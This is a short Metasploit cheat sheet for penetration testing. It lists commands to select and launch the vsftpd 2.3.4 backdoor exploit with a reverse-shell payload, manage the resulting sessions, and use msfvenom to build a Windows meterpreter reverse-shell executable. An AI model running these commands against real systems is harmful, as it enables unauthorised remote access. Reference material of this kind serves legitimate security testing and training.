# Common Commands

## Starting Up

```bash
# Launch the interactive console
msfconsole
```

## Finding and Configuring a Module

```
# Search for a module by keyword/CVE
search type:exploit vsftpd

# Select a module
use exploit/unix/ftp/vsftpd_234_backdoor

# View required and optional settings
show options

# Set target and payload
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD cmd/unix/reverse

# Launch
exploit
```

## Managing Sessions

```
# List active sessions
sessions -l

# Interact with a specific session
sessions -i 1

# Background the current session
background
```

## Payload Generation (msfvenom)

```bash
# Generate a Windows reverse shell executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > payload.exe
```

---

